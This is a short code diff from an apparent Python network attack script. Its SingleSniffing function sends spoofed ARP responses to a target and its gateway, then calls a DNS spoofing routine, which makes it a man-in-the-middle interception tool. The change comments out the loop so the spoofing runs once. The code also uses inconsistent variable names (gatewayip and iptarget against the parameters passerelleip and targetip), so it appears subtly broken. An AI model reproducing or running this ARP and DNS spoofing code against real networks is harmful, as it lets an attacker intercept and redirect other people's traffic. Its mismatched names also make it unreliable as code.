@@ -30,10 +30,10 @@ def SingleSniffing(targetip, passerelleip):
 		gatewaymac = getmacbyip(conf.route.route(passerelleip)[2])
 		try:
 			print("Sending spoofed ARP responses")
-			while True:
-				spoofarpcache(targetip, targetmac, gatewayip)
-				spoofarpcache(gatewayip, gatewaymac, targetip)
-				DNSSpoofing(iptarget)
+			#while True:
+			spoofarpcache(targetip, targetmac, gatewayip)
+			spoofarpcache(gatewayip, gatewaymac, targetip)
+			DNSSpoofing(iptarget)
 		except KeyboardInterrupt:
 			print("ARP spoofing stopped")
 			restorearp(gatewayip, gatewaymac, targetip, getmacbyip(targetip))
